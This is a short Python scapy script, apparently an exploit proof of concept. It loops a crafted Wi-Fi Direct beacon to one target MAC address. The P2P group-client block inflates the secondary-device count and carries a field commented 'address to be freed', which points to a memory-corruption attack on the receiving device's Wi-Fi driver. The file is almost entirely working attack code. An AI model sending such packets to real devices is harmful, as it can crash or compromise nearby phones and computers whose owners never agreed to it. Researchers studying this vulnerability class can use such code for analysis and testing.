from scapy.all import *

iface = 'wlp4s0mon'           # interface in monitor mode
target = 'ac:04:0b:e9:30:69'  # target MAC address
mac = RandMAC()               # (fake) mac address of source 

dot11 = Dot11FCS(addr1=target, addr2=mac)
beacon = Dot11Beacon(cap='ESS+privacy')
essid = Dot11Elt(ID='SSID', info='DIRECT-XX') # DIRECT- SSID for WFD
rates = Dot11Elt(ID='Rates', info=b"\x48")    # rate of monitor mode iface
rsn  = Dot11Elt(ID='RSNinfo', info=(
    b"\x01\x00"          # RSN Version 1
    b"\x00\x0f\xac\x02"  # Group Cipher Suite : 00-0f-ac TKIP
    b"\x02\x00"          # 2 Pairwise Cipher Suites (next two lines)
    b"\x00\x0f\xac\x04"  # AES Cipher
    b"\x00\x0f\xac\x02"  # TKIP Cipher
    b"\x01\x00"          # 1 Authentication Key Managment Suite (line below)
    b"\x00\x0f\xac\x02"  # Pre-Shared Key
    b"\x00\x00"))        # RSN Capabilities (no extra capabilities)

sec_devs = 0x13 # number of secondary devices
group = (
    b"AAAAAA" +                    # p2p client device id
    b"BBBBBB" +                    # p2p client interface id
    b"\xff" + b"\x01\x88" +        # capabilities, config methods
    b"EEEEEEEE" +                  # primary dev type
    struct.pack("<B", sec_devs) +  # secondary dev type count
    b"\x00"*(sec_devs*8-12) +      # nulls to fill up sec devs
    b"AAAAAAAA" +                  # address to be freed
    b"\x00\x00\x00\x00" +          # 4 nulls for padding
    b"\x10\x11\x00\x00")           # empty device name 

group = struct.pack("<B", len(group)) + group # p2p group info 
p2p = Dot11EltVendorSpecific(oui=0x506f9a, info=(
    b"\x09\x03" +                    # p2p identifier
    b"\x06\x00" + b"DDDDDD" +        # p2p device id len, id
    b"\x0e" +                        # p2p client info identifier
    struct.pack("<H", len(group)) +  # total length of group client 
    group))                          # group client data

# assemble and send packet
packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p
sendp(packet, iface=iface, inter=0.100, loop=1)
